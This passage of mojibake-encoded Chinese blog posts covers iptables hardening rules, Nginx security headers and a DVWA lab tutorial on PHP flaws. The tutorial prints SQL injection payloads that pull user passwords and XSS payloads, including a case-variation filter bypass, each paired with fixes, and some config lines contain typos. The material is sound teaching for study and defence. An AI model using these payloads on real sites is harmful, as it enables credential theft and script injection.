<h1 id="0x03-iptableså‘½ä»¤å‚è€ƒ"><a href="#0x03-iptableså‘½ä»¤å‚è€ƒ" class="headerlink" title="0x03 iptableså‘½ä»¤å‚è€ƒ"></a>0x03 iptableså‘½ä»¤å‚è€ƒ</h1><p>å‘½ä»¤ï¼š</p>
<p>iptables [ -t è¡¨å] å‘½ä»¤é€‰é¡¹ [é“¾å] [æ¡ä»¶åŒ¹é…] [-j ç›®æ ‡åŠ¨ä½œæˆ–è·³è½¬] </p>
<p><strong>1. è¡¨å</strong></p>
<p>è¡¨åï¼šFilter, NAT, Mangle, Raw</p>
<p>èµ·åŒ…è¿‡æ»¤åŠŸèƒ½çš„ä¸ºè¡¨Filterï¼Œå¯ä»¥ä¸å¡«ï¼Œä¸å¡«é»˜è®¤ä¸ºFilter</p>
<p><strong>2. å‘½ä»¤é€‰é¡¹</strong></p>
<p>é€‰é¡¹å     åŠŸèƒ½åŠç‰¹ç‚¹</p>
<p>-A        åœ¨æŒ‡å®šé“¾çš„æœ«å°¾æ·»åŠ ï¼ˆâ€“appendï¼‰ä¸€æ¡æ–°çš„è§„åˆ™</p>
<p>-D        åˆ é™¤ï¼ˆâ€“deleteï¼‰æŒ‡å®šé“¾ä¸­çš„æŸä¸€æ¡è§„åˆ™ï¼ŒæŒ‰è§„åˆ™åºå·æˆ–å†…å®¹ç¡®å®šè¦åˆ é™¤çš„è§„åˆ™</p>
<p>-I        åœ¨æŒ‡å®šé“¾ä¸­æ’å…¥ï¼ˆâ€“insertï¼‰ä¸€æ¡æ–°çš„è§„åˆ™ï¼Œé»˜è®¤åœ¨é“¾çš„å¼€å¤´æ’å…¥</p>
<p>-R        ä¿®æ”¹ã€æ›¿æ¢ï¼ˆâ€“replaceï¼‰æŒ‡å®šé“¾ä¸­çš„ä¸€æ¡è§„åˆ™ï¼ŒæŒ‰è§„åˆ™åºå·æˆ–å†…å®¹ç¡®å®š</p>
<p>-L        åˆ—å‡ºï¼ˆâ€“listï¼‰æŒ‡å®šé“¾ä¸­çš„æ‰€æœ‰çš„è§„åˆ™è¿›è¡ŒæŸ¥çœ‹ï¼Œé»˜è®¤åˆ—å‡ºè¡¨ä¸­æ‰€æœ‰é“¾çš„å†…å®¹</p>
<p>-F        æ¸…ç©ºï¼ˆâ€“flushï¼‰æŒ‡å®šé“¾ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼Œé»˜è®¤æ¸…ç©ºè¡¨ä¸­æ‰€æœ‰é“¾çš„å†…å®¹</p>
<p>-N        æ–°å»ºï¼ˆâ€“new-chainï¼‰ä¸€æ¡ç”¨æˆ·è‡ªå·±å®šä¹‰çš„è§„åˆ™é“¾</p>
<p>-X        åˆ é™¤æŒ‡å®šè¡¨ä¸­ç”¨æˆ·è‡ªå®šä¹‰çš„è§„åˆ™é“¾ï¼ˆâ€“delete-chainï¼‰</p>
<p>-P        è®¾ç½®æŒ‡å®šé“¾çš„é»˜è®¤ç­–ç•¥ï¼ˆâ€“policyï¼‰</p>
<p>-n        ç”¨æ•°å­—å½¢å¼ï¼ˆâ€“numericï¼‰æ˜¾ç¤ºè¾“å‡ºç»“æœï¼Œè‹¥æ˜¾ç¤ºä¸»æœºçš„ IPåœ°å€è€Œä¸æ˜¯ä¸»æœºå</p>
<p>-P        è®¾ç½®æŒ‡å®šé“¾çš„é»˜è®¤ç­–ç•¥ï¼ˆâ€“policyï¼‰</p>
<p>-v        æŸ¥çœ‹è§„åˆ™åˆ—è¡¨æ—¶æ˜¾ç¤ºè¯¦ç»†ï¼ˆâ€“verboseï¼‰çš„ä¿¡æ¯</p>
<p>-V        æŸ¥çœ‹iptableså‘½ä»¤å·¥å…·çš„ç‰ˆæœ¬ï¼ˆâ€“Versionï¼‰ä¿¡æ¯</p>
<p>-h        æŸ¥çœ‹å‘½ä»¤å¸®åŠ©ä¿¡æ¯ï¼ˆâ€“helpï¼‰</p>
<p>â€“line-number    æŸ¥çœ‹è§„åˆ™åˆ—è¡¨æ—¶ï¼ŒåŒæ—¶æ˜¾ç¤ºè§„åˆ™åœ¨é“¾ä¸­çš„é¡ºåºå·</p>
<p><strong>3. é“¾å</strong></p>
<p>å¯ä»¥æ ¹æ®æ•°æ®æµå‘æ¥ç¡®å®šå…·ä½“ä½¿ç”¨å“ªä¸ªé“¾ï¼Œåœ¨Filterä¸­çš„ä½¿ç”¨æƒ…å†µå¦‚ä¸‹ï¼š</p>
<ol>
<li>INPUTé“¾ â€“ å¤„ç†æ¥è‡ªå¤–éƒ¨çš„æ•°æ®ã€‚ </li>
<li>OUTPUTé“¾ â€“ å¤„ç†å‘å¤–å‘é€çš„æ•°æ®ã€‚ </li>
<li>FORWARDé“¾ â€“ å°†æ•°æ®è½¬å‘åˆ°æœ¬æœºçš„å…¶ä»–ç½‘å¡è®¾å¤‡ä¸Šã€‚</li>
</ol>
<p><strong>4. æ¡ä»¶åŒ¹é…</strong></p>
<p>æ¡ä»¶åŒ¹é…åˆ†ä¸ºåŸºæœ¬åŒ¹é…å’Œæ‰©å±•åŒ¹é…ï¼Œæ‰©å±•åŒ¹é…åˆåˆ†ä¸ºéšå¼æ‰©å±•å’Œæ˜¾ç¤ºæ‰©å±•ã€‚</p>
<p>a)åŸºæœ¬åŒ¹é…åŒ…æ‹¬ï¼š</p>
<p>åŒ¹é…å‚æ•°    è¯´æ˜</p>
<p>-p        æŒ‡å®šè§„åˆ™åè®®ï¼Œå¦‚tcp, udp,icmpç­‰ï¼Œå¯ä»¥ä½¿ç”¨allæ¥æŒ‡å®šæ‰€æœ‰åè®®</p>
<p>-s        æŒ‡å®šæ•°æ®åŒ…çš„æºåœ°å€å‚æ•°ï¼Œå¯ä»¥ä½¿IPåœ°å€ã€ç½‘ç»œåœ°å€ã€ä¸»æœºå</p>
<p>-d        æŒ‡å®šç›®çš„åœ°å€</p>
<p>-i        è¾“å…¥æ¥å£</p>
<p>-o        è¾“å‡ºæ¥å£</p>
<p>b)éšå¼æ‰©å±•åŒ…æ‹¬ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/iptables2.jpg" alt=""></p>
<p>c)å¸¸ç”¨æ˜¾å¼æ‰©å±•</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/iptables3.jpg" alt=""></p>
<p><strong>5. ç›®æ ‡å€¼</strong></p>
<p>æ•°æ®åŒ…æ§åˆ¶æ–¹å¼åŒ…æ‹¬å››ç§ä¸ºï¼š</p>
<pre><code>ACCEPTï¼šå…è®¸æ•°æ®åŒ…é€šè¿‡ã€‚ 
DROPï¼šç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œä¸ç»™å‡ºä»»ä½•å›åº”ä¿¡æ¯ã€‚ 
REJECTï¼šæ‹’ç»æ•°æ®åŒ…é€šè¿‡ï¼Œå¿…é¡»æ—¶ä¼šç»™æ•°æ®å‘é€ç«¯ä¸€ä¸ªå“åº”ä¿¡æ¯ã€‚ 
LOGï¼šåœ¨/var/log/messages æ–‡ä»¶ä¸­è®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’ç»™ä¸‹ä¸€æ¡è§„åˆ™ã€‚ 
QUEUEï¼šé˜²ç«å¢™å°†æ•°æ®åŒ…ç§»äº¤åˆ°ç”¨æˆ·ç©ºé—´ 
RETURNï¼šé˜²ç«å¢™åœæ­¢æ‰§è¡Œå½“å‰é“¾ä¸­çš„åç»­Rulesï¼Œå¹¶è¿”å›åˆ°è°ƒç”¨é“¾(the calling chain) 
</code></pre><h1 id="0x04-Iptableså¸¸è§å‘½ä»¤"><a href="#0x04-Iptableså¸¸è§å‘½ä»¤" class="headerlink" title="0x04 Iptableså¸¸è§å‘½ä»¤"></a>0x04 Iptableså¸¸è§å‘½ä»¤</h1><ol>
<li><p>åˆ é™¤iptablesç°æœ‰è§„åˆ™</p>
<blockquote>
<p>iptables â€“F </p>
</blockquote>
</li>
<li><p>æŸ¥çœ‹iptablesè§„åˆ™</p>
<blockquote>
<p>iptables â€“Lï¼ˆiptables â€“L â€“v -nï¼‰ </p>
</blockquote>
</li>
<li><p>å¢åŠ ä¸€æ¡è§„åˆ™åˆ°æœ€å</p>
<blockquote>
<p>iptables -A INPUT -i eth0 -p tcp â€“dport 80 -m state â€“state NEW,ESTABLISHED -j ACCEPT </p>
</blockquote>
</li>
<li><p>æ·»åŠ ä¸€æ¡è§„åˆ™åˆ°æŒ‡å®šä½ç½®</p>
<blockquote>
<p>iptables -I INPUT 2 -i eth0 -p tcp â€“dport 80 -m state â€“state NEW,ESTABLISHED -j ACCEPT </p>
</blockquote>
</li>
<li><p>åˆ é™¤ä¸€æ¡è§„åˆ™</p>
<blockquote>
<p>iptabels -D INPUT 2 </p>
</blockquote>
</li>
<li><p>ä¿®æ”¹ä¸€æ¡è§„åˆ™</p>
<blockquote>
<p>iptables -R INPUT 3 -i eth0 -p tcp â€“dport 80 -m state â€“state NEW,ESTABLISHED -j ACCEPT </p>
</blockquote>
</li>
<li><p>è®¾ç½®é»˜è®¤ç­–ç•¥</p>
<blockquote>
<p>iptables -P INPUT DROP </p>
</blockquote>
</li>
<li><p>å…è®¸è¿œç¨‹ä¸»æœºè¿›è¡ŒSSHè¿æ¥</p>
<blockquote>
<p>iptables -A INPUT -i eth0 -p tcp â€“dport 22 -m state â€“state NEW,ESTABLISHED -j ACCEPT</p>
<p>iptables -A OUTPUT -o eth0 -p tcp â€“sport 22 -m state â€“state ESTABLISHED -j ACCEPT </p>
</blockquote>
</li>
<li><p>å…è®¸æœ¬åœ°ä¸»æœºè¿›è¡ŒSSHè¿æ¥</p>
<blockquote>
<p>iptables -A OUTPUT -o eth0 -p tcp â€“dport 22 -m state â€“state NEW,ESTABLISHED -j ACCEPT</p>
<p>iptables -A INTPUT -i eth0 -p tcp â€“sport 22 -m state â€“state ESTABLISHED -j ACCEPT </p>
</blockquote>
</li>
<li><p>å…è®¸HTTPè¯·æ±‚</p>
<blockquote>
<p>iptables -A INPUT -i eth0 -p tcp â€“dport 80 -m state â€“state NEW,ESTABLISHED -j ACCEPT</p>
<p>iptables -A OUTPUT -o eth0 -p tcp â€“sport 80 -m state â€“state ESTABLISHED -j ACCEPT </p>
</blockquote>
</li>
<li><p>é™åˆ¶ping 192.168.146.3ä¸»æœºçš„æ•°æ®åŒ…æ•°ï¼Œå¹³å‡2/sä¸ªï¼Œæœ€å¤šä¸èƒ½è¶…è¿‡3ä¸ª</p>
<blockquote>
<p>iptables -A INPUT -i eth0 -d 192.168.146.3 -p icmp â€“icmp-type 8 -m limit â€“limit 2/second â€“limit-burst 3 -j ACCEPT </p>
</blockquote>
</li>
<li><p>é™åˆ¶SSHè¿æ¥é€Ÿç‡(é»˜è®¤ç­–ç•¥æ˜¯DROP)</p>
<blockquote>
<p>iptables -I INPUT 1 -p tcp â€“dport 22 -d 192.168.146.3 -m state â€“state ESTABLISHED -j ACCEPT</p>
<p>iptables -I INPUT 2 -p tcp â€“dport 22 -d 192.168.146.3 -m limit â€“limit 2/minute â€“limit-burst 2 -m state â€“state NEW -j ACCEPT </p>
</blockquote>
</li>
</ol>
<h1 id="0x05-ä½¿ç”¨iptablesæŠµæŠ—å¸¸è§æ”»å‡»"><a href="#0x05-ä½¿ç”¨iptablesæŠµæŠ—å¸¸è§æ”»å‡»" class="headerlink" title="0x05 ä½¿ç”¨iptablesæŠµæŠ—å¸¸è§æ”»å‡»"></a>0x05 ä½¿ç”¨iptablesæŠµæŠ—å¸¸è§æ”»å‡»</h1><p><strong>1.é˜²æ­¢synæ”»å‡»</strong></p>
<p>æ€è·¯ä¸€ï¼šé™åˆ¶synçš„è¯·æ±‚é€Ÿåº¦ï¼ˆè¿™ä¸ªæ–¹å¼éœ€è¦è°ƒèŠ‚ä¸€ä¸ªåˆç†çš„é€Ÿåº¦å€¼ï¼Œä¸ç„¶ä¼šå½±å“æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚ï¼‰</p>
<pre><code>iptables -N syn-flood 
iptables -A INPUT -p tcp --syn -j syn-flood 
iptables -A syn-flood -m limit --limit 1/s --limit-burst 4 -j RETURN 
iptables -A syn-flood -j DROP 
</code></pre><p>æ€è·¯äºŒï¼šé™åˆ¶å•ä¸ªipçš„æœ€å¤§synè¿æ¥æ•°</p>
<pre><code>iptables â€“A INPUT â€“i eth0 â€“p tcp --syn -m connlimit --connlimit-above 15 -j DROP 
</code></pre><p><strong>2. é˜²æ­¢DOSæ”»å‡»</strong></p>
<p>åˆ©ç”¨recentæ¨¡å—æŠµå¾¡DOSæ”»å‡»</p>
<pre><code>iptables -I INPUT -p tcp -dport 22 -m connlimit --connlimit-above 3 -j DROP 
å•ä¸ªIPæœ€å¤šè¿æ¥3ä¸ªä¼šè¯

iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH  
åªè¦æ˜¯æ–°çš„è¿æ¥è¯·æ±‚ï¼Œå°±æŠŠå®ƒåŠ å…¥åˆ°SSHåˆ—è¡¨ä¸­

Iptables -I INPUT -p tcp --dport 22 -m state NEW -m recent --update --seconds 300 --hitcount 3 --name SSH -j DROP  
5åˆ†é’Ÿå†…ä½ çš„å°è¯•æ¬¡æ•°è¾¾åˆ°3æ¬¡ï¼Œå°±æ‹’ç»æä¾›SSHåˆ—è¡¨ä¸­çš„è¿™ä¸ªIPæœåŠ¡ã€‚è¢«é™åˆ¶5åˆ†é’Ÿåå³å¯æ¢å¤è®¿é—®ã€‚
</code></pre><p><strong>3. é˜²æ­¢å•ä¸ªipè®¿é—®é‡è¿‡å¤§</strong></p>
<pre><code>iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j DROP 
</code></pre><p><strong>4. æœ¨é©¬åå¼¹</strong></p>
<pre><code>iptables â€“A OUTPUT â€“m state --state NEW â€“j DROP 
</code></pre><p><strong>5. é˜²æ­¢pingæ”»å‡»</strong></p>
<pre><code>iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/m -j ACCEPT 
</code></pre><p>å‚è€ƒèµ„æ–™ï¼š<a href="http://drops.wooyun.org/tips/1424" target="_blank" rel="external">ä¹Œäº‘-iptablesåŸºç¡€çŸ¥è¯†</a></p>
]]></content>
      
        
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> iptables </tag>
            
            <tag> linux </tag>
            
            <tag> åº”æ€¥å“åº” </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTTP header å®‰å…¨é…ç½®]]></title>
      <url>/2016/09/02/header%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<p>ç°ä»£æµè§ˆå™¨æä¾›äº†ä¸€äº›å®‰å…¨ç›¸å…³çš„å“åº”å¤´ï¼Œä½¿ç”¨è¿™äº›å“åº”å¤´ä¸€èˆ¬åªéœ€è¦ä¿®æ”¹æœåŠ¡å™¨é…ç½®å³å¯ï¼Œä¸éœ€è¦ä¿®æ”¹ç¨‹åºä»£ç ï¼Œæˆæœ¬å¾ˆä½ã€‚</p>
<a id="more"></a>
<p>å®‰å…¨æ–¹é¢çš„ HTTP Header</p>
<p><strong>é˜²å¾¡ XSS (Cross Site Scripting)ï¼š</strong></p>
<ul>
<li>Content-Security-Policy</li>
<li>Set-Cookie: HttpOnly</li>
<li>X-XSS-Protection</li>
<li>X-Download-Options</li>
</ul>
<p>Nginxåœ¨nginx.confçš„serveræ®µä¸­åŠ å…¥ï¼š</p>
<blockquote>
<p>add_header X-XSS-Protection â€œ1; mode=blockâ€;</p>
</blockquote>
<p>åœ¨Nginx.confçš„serveræ®µåŠ å…¥ï¼š</p>
<blockquote>
<p>add_header Content-Security-Policy: script-src &#039;self&#039; <a href="https://apis.google.com" target="_blank" rel="external">https://apis.google.com</a></p>
</blockquote>
<p><strong>é˜²å¾¡ Clickjackingï¼š</strong></p>
<ul>
<li>X-Frame-Options</li>
</ul>
<blockquote>
<p>add_header X-Frame-Options: DENY</p>
</blockquote>
<p>Nginxä¸­ç¼–è¾‘nginx.conf ï¼Œåœ¨serveræ®µåŠ å…¥ï¼š</p>
<blockquote>
<p>add_header X-Frame-Options â€œSAMEORIGINâ€;</p>
</blockquote>
<p><strong>å¼ºåŒ– HTTPSæœºåˆ¶ï¼š</strong></p>
<ul>
<li>Set-Cookie: Secure</li>
<li>Strict-Transport-Security</li>
</ul>
<p>åœ¨Nginx.confçš„serveræ®µåŠ å…¥ï¼š</p>
<blockquote>
<p>add_header Strict-Transport-Security â€œmax-age=31536000; includeSubdomains;â€;</p>
</blockquote>
<p><strong>é¿å…æµè§ˆå™¨è¯¯åˆ¤æ–‡ä»¶å½¢å¼ï¼š</strong></p>
<ul>
<li>X-Content-Type-Options</li>
</ul>
<p>åœ¨Nginx.confçš„serveræ®µåŠ å…¥ï¼š</p>
<blockquote>
<p>add_header X-Content-Type-Options nosniff;</p>
</blockquote>
<p><strong>ä¿è¯ç½‘ç«™èµ„æºè¢«ä»»æ„å­˜å–ï¼š</strong></p>
<ul>
<li>Access-Control-Allow-Originï¼ˆæ­¤ header è‹¥è¨­å®šéŒ¯èª¤æœƒé©å¾—å…¶åï¼ï¼‰</li>
<li>X-Permitted-Cross-Domain-Policies</li>
</ul>
<blockquote>
<p>add_header ccess-Control-Allow-Origin: <a href="http://foo.example" target="_blank" rel="external">http://foo.example</a><br>Access-Control-Allow-Origin: *</p>
</blockquote>
<p><strong>Cookieä¿æŠ¤</strong></p>
<ul>
<li>HttpOnlyï¼Œä¼šé˜»æ­¢XSSæ”»å‡»å°†ä½ çš„ç”¨æˆ·cookieå‘ç»™é»‘å®¢</li>
<li>Secure,å±æ€§èƒ½è®©Cookieé€šè¿‡HTTPSè¿æ¥ï¼Œè€Œä¸æ˜¯HTTPï¼Œè¿™æ ·ï¼Œèƒ½å¤Ÿè®¿é—®ä½ çš„ç½‘ç»œçš„é»‘å®¢æ— æ³•è¯»å–æœªåŠ å¯†çš„Cookieã€‚</li>
</ul>
<blockquote>
<p>add_header Set-Cookie: HttpOnly</p>
<p>add_header Set-Cookie: Secure</p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> XSS </tag>
            
            <tag> å®‰å…¨å¼€å‘ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ä»DVWAä¸­å­¦ä¹ PHPå¸¸è§æ¼æ´åŠé˜²å¾¡]]></title>
      <url>/2016/09/01/%E4%BB%8EDVWA%E4%B8%AD%E5%AD%A6%E4%B9%A0PHP%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E9%98%B2%E5%BE%A1/</url>
      <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>â€œå®‰å…¨æ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œä¿è¯å®‰å…¨ä¸åœ¨äºå¼ºå¤§çš„åœ°æ–¹æœ‰å¤šå¼ºå¤§ è€Œåœ¨äºçœŸæ­£è–„å¼±çš„åœ°æ–¹åœ¨å“ªé‡Œâ€â€“å‰‘å¿ƒ</p>
<p>æ¼æ´å½¢æˆçš„åŸå› å°±æ˜¯æ¥å—äº†ä¸å®‰å…¨çš„å˜é‡è¾“å…¥ï¼Œåˆæ²¡å¾—åˆ°æœ‰æ•ˆçš„è¿‡æ»¤ï¼Œæœ€åè¿›å…¥ä¸€äº›å¯¹æ•æ„Ÿçš„å‡½æ•°å°±ä¼šå¯¹å®‰å…¨é€ æˆå¨èƒã€‚æ¯”å¦‚å‡ºç°åœ¨<code>mysql_query()</code>å‡½æ•°å¯èƒ½å°±ä¼šé€ æˆSQLæ³¨å…¥æ¼æ´ï¼Œå‡ºç°åœ¨<code>eval()</code>ä»¥åŠ<code>preg_replace()</code>ä¸­å¯èƒ½å¯¼è‡´ä»£ç çš„æ‰§è¡Œã€‚<br><a id="more"></a></p>
<p>ä¸»è¦ä»‹ç»DVWAä¸Šçš„æ¼æ´åŠä¿®å¤æ–¹æ¡ˆï¼š<br><a href="https://github.com/RandomStorm/DVWA/archive/v1.0.8.zip" target="_blank" rel="external">DVWAä¸‹è½½åœ°å€</a></p>
<h1 id="0x01-SQLæ³¨å…¥æ¼æ´"><a href="#0x01-SQLæ³¨å…¥æ¼æ´" class="headerlink" title="0x01 SQLæ³¨å…¥æ¼æ´"></a>0x01 SQLæ³¨å…¥æ¼æ´</h1><p>lowçš„çº§åˆ«ä¸‹$idå˜é‡æ²¡æœ‰ç»è¿‡ä»»ä½•çš„è¿‡æ»¤ï¼Œç›´æ¥ä¼ å…¥äº†sqlè¯­å¥ï¼Œé€ æˆå­—ç¬¦å‹æ³¨å…¥</p>
<p>POC:</p>
<blockquote>
<p>â€˜ union select user,password from users#</p>
</blockquote>
<p>SQLè¯­å¥ä¸ºï¼š</p>
<blockquote>
<p>SELECT first_name, last_name FROM users WHERE user_id = â€˜â€™ union select user,password from users#</p>
</blockquote>
<p>mediumçº§åˆ«ä¸‹è™½ç„¶$idç»è¿‡äº†mysql_real_escape_stringè½¬ä¹‰äº†<code>â€™</code>ï¼Œå¯æ˜¯å› ä¸ºåé¢çš„SQLè¯­å¥$idæ²¡æœ‰å•å¼•å·ä¿æŠ¤ï¼Œä¼šè¢«ç³»ç»Ÿè®¤ä¸ºæ˜¯æ•°å€¼å‹ï¼Œå¯¼è‡´æ•°å€¼å‹æ³¨å…¥</p>
<p>POC:</p>
<blockquote>
<p>1 union select user,password from users</p>
</blockquote>
<p>SQLè¯­å¥ä¸ºï¼š</p>
<blockquote>
<p>SELECT first_name, last_name FROM users WHERE user_id = 1 union select user,password from users</p>
</blockquote>
<p><strong>SQLæ³¨å…¥ä¿®è¡¥æ–¹æ³•</strong></p>
<p>å­—ç¬¦å‹æ³¨å…¥æ¼æ´ä¿®è¡¥æ–¹æ³•ï¼š</p>
<p>PHP5.3ä¹‹å‰ç‰ˆæœ¬åœ¨php.iniä¸­è®¾ç½®<code>magic_quotes_gpc=On</code>; <code>magic_quotes_quotes_gpc</code>ä¼šå¯¹ä¼ å…¥çš„$_POST,$_GET,$_SERVERé‡Œçš„ â€˜,â€,\è¿›è¡Œè½¬ä¹‰ã€‚</p>
<p>ä½†æ˜¯PHP5.4ä¹‹åï¼Œ<code>magic_quotes_quotes_gpc</code>å°±è¢«åºŸé™¤äº†ã€‚</p>
<p>è¿˜è¦ä½¿ç”¨<code>mysql_real_escape_string()</code>æˆ–<code>addslashes()</code>å¯¹ä¼ å…¥å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œæˆ–è€…ä½¿ç”¨<code>str_replace()</code>å¯¹ä¸€äº›å…³é”®è¯è¿›è¡Œæ›¿æ¢ã€‚</p>
<p>ä½†æ˜¯<code>addslashes()</code>å’Œ<code>mysql_real_escape_string()</code>åœ¨æ•°æ®åº“å­—ç¬¦é›†è®¾ä¸ºGBKæ—¶æ˜¯å¯èƒ½è¢«ç»•è¿‡çš„ã€‚</p>
<p>å¦‚æœæ•°æ®åº“å­—ç¬¦é›†æ˜¯GBKçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥æŠŠ</p>
<pre><code>$mysqli-&gt;query(&apos;SET NAMES gbk&apos;); 
</code></pre><p>ä¿®æ”¹ä¸ºï¼š</p>
<pre><code>$mysqli-&gt;set_charset(&apos;gbk&apos;);
</code></pre><p>æ•°å€¼å‹æ³¨å…¥ï¼š</p>
<p>æ•°å€¼å‹æ³¨å…¥æ¯”è¾ƒå¥½ä¿®è¡¥ï¼Œåªéœ€è¦åˆ¤æ–­ä¼ å…¥çš„å˜é‡æ˜¯å¦ä¸ºæ•°å€¼å‹å°±å¯ä»¥äº†(æˆ–è€…å¼ºè¡Œæ”¹æˆæ•°å€¼å‹<code>mysql_numrows</code>)</p>
<h1 id="0x02-XSSæ¼æ´"><a href="#0x02-XSSæ¼æ´" class="headerlink" title="0x02 XSSæ¼æ´"></a>0x02 XSSæ¼æ´</h1><p>é»‘å®¢å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„htmlä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„htmlä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°é»‘å®¢çš„ç‰¹æ®Šç›®çš„ï¼Œæ¯”å¦‚çªƒå–ç”¨æˆ·cookies.æˆ–è€…è¿›è¡Œå…¶ä»–æ“ä½œã€‚</p>
<p>lowçº§åˆ«ä¸‹$message,$nameä¸¤ä¸ªå˜é‡ä»<code>$_POST</code>ä¼ å…¥,åªæ˜¯ç»è¿‡ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„è½¬æ¢ã€‚å¹¶æ²¡æœ‰å¯¹å°–æ‹¬å·è¿›è¡Œè½¬ä¹‰,æ‰€ä»¥è¿˜æ˜¯é€ æˆäº†XSSçš„äº§ç”Ÿã€‚</p>
<p>POC:</p>
<blockquote>
<p><code>&lt;script&gt;alert(1)&lt;script&gt;</code></p>
</blockquote>
<p>mediumçº§åˆ«ä¸‹ï¼Œè™½ç„¶å¯¹$messageè¿›è¡Œäº†å°–æ‹¬å·è½¬ä¹‰ï¼Œè€Œä¸”å¯¹<code>&lt;script&gt;</code>è¿›è¡Œäº†æ›¿æ¢ï¼Œä½†æ˜¯$nameæ²¡æœ‰è¿›è¡Œè½¬ä¹‰ï¼Œè€Œä¸”è·¨ç«™è„šæœ¬å¯ä»¥ç”¨å¤šç§æ ‡ç­¾ï¼Œå¦‚<code>&lt;img /&gt;</code>,ç­‰â€¦ã€‚Nameçš„<code>&lt;input /&gt;</code>é™åˆ¶äº†<code>maxlength=â€˜10â€™</code>çš„é•¿åº¦ï¼Œä½†æ˜¯æˆ‘ä»¬çš„é˜²å¾¡å¯¹è±¡æ˜¯ç²¾é€šæŠ€æœ¯çš„é»‘å®¢ã€‚è¿™ç§htmlä¸‹çš„é•¿åº¦é™åˆ¶æ˜¯å¯ä»¥ç›´æ¥é€šè¿‡æµè§ˆå™¨ä¿®æ”¹..ç„¶åé€šè¿‡å¤§å°å†™æˆåŠŸç»•è¿‡<code>str_replace()</code>ï¼Œæ’å…¥XSS.</p>
<p>POC:</p>
<blockquote>
<p><code>&lt;SCript&gt;alert(1)&lt;/SCript&gt;</code></p>
</blockquote>
<p><strong>XSSä¿®å¤æ–¹æ³•</strong></p>
<p>åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTMLæ ‡ç­¾ä¹‹é—´æ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒHTML Entityç¼–ç </p>
<p>åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTMLå±æ€§é‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒHTMLå±æ€§ç¼–ç </p>
<p>åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°SCRIPTé‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒSCRIPTç¼–ç </p>
<p>åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°Styleå±æ€§é‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒCSSç¼–ç </p>
<p>åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTML URLé‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒURLç¼–ç </p>
<p>ä½¿ç”¨å¯Œæ–‡æœ¬æ—¶ï¼Œä½¿ç”¨XSSè§„åˆ™å¼•æ“è¿›è¡Œç¼–ç è¿‡æ»¤</p>
<p>å…¶å®ä½¿ç”¨htmlspecialchars()åœ¨è¾“å‡ºæ—¶å¯¹è¾“å‡ºå†…å®¹è¿›è¡Œè½¬ä¹‰ã€‚åœ¨è¾“å‡ºæ—¶è¿›è¡Œè½¬ä¹‰æ¯”è¾“å…¥æ—¶è¿›è¡Œè½¬ä¹‰æ•ˆæœæ›´å¥½ï¼Œå› ä¸ºå¯ä»¥ç¡®ä¿æ•°æ®åœ¨å…¥åº“æ—¶æ˜¯å®Œæ•´çš„â€¦.ä¸ç„¶ä¸¢å¤±æ•°æ®ã€‚</p>
<h1 id="0x03-ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#0x03-ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="0x03 ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>0x03 ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="http://byd.dropsec.xyz/2016/07/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">å‘½ä»¤æ‰§è¡Œæ¼æ´æ€»ç»“</a></p>
<h1 id="0x04-æš´åŠ›ç ´è§£"><a href="#0x04-æš´åŠ›ç ´è§£" class="headerlink" title="0x04 æš´åŠ›ç ´è§£"></a>0x04 æš´åŠ›ç ´è§£</h1><p>åŠ ä¸ªgoogleéªŒè¯ç ï¼Œä¿è¯æ²¡æœ‰ç¨‹åºèƒ½è¯†åˆ«å‡ºæ¥â€¦</p>
